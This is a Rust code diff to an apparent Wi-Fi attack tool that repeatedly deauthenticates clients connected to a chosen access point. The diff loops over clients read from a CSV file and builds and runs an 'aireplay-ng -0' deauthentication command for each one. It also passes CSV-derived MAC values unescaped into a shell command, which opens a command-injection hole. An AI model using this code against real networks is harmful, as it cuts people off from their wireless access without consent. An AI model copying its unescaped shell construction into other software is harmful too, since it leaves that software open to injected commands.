@@ -20,7 +20,7 @@ fn main() {
             bssid,
             interface,
             excluded_macs,
-        } => block_client(&opt.csv_path, &bssid, &interface, &excluded_macs),
+        } => block_client(&opt.csv_path, &bssid, &interface, excluded_macs.as_ref()),
     };
 
     if let Err(error) = result {
@@ -46,7 +46,7 @@ fn block_client(
     csv_path: &PathBuf,
     bssid: &str,
     interface: &str,
-    excluded_macs: &Vec<String>,
+    excluded_macs: Option<&Vec<String>>,
 ) -> Result<()> {
     let (stations, clients) = csv::get_csv_data(&csv_path).context("Error while reading csv")?;
 
@@ -65,17 +65,27 @@ fn block_client(
 
     loop {
         for client in clients.iter() {
-            if is_excluded(&client.station_mac, excluded_macs) {
+            // Ignore all excluded macs
+            if let Some(excluded_macs) = excluded_macs {
+                if is_excluded(&client.station_mac, excluded_macs) {
+                    continue;
+                };
+            }
+
+            // Don't send deauth to clients that aren't connected to the target
+            if client.bssid != bssid {
                 continue;
-            };
+            }
+
+            // compile the aireplay command and execute
+            println!("Block client {} connected to {}", client.station_mac, bssid);
             let command = format!(
                 "aireplay-ng -0 1 -a {} -c {} {}",
                 bssid, client.station_mac, interface
             );
-            println!("Block client {} connected to {}", client.station_mac, bssid);
 
             let exec = Exec::shell(&command);
-            let exit_status = exec.join()?;
+            let exit_status = exec.join().context("Execute aireplay-ng")?;
             if !exit_status.success() {
                 bail!("Process failed with: {:?}", exit_status);
             }
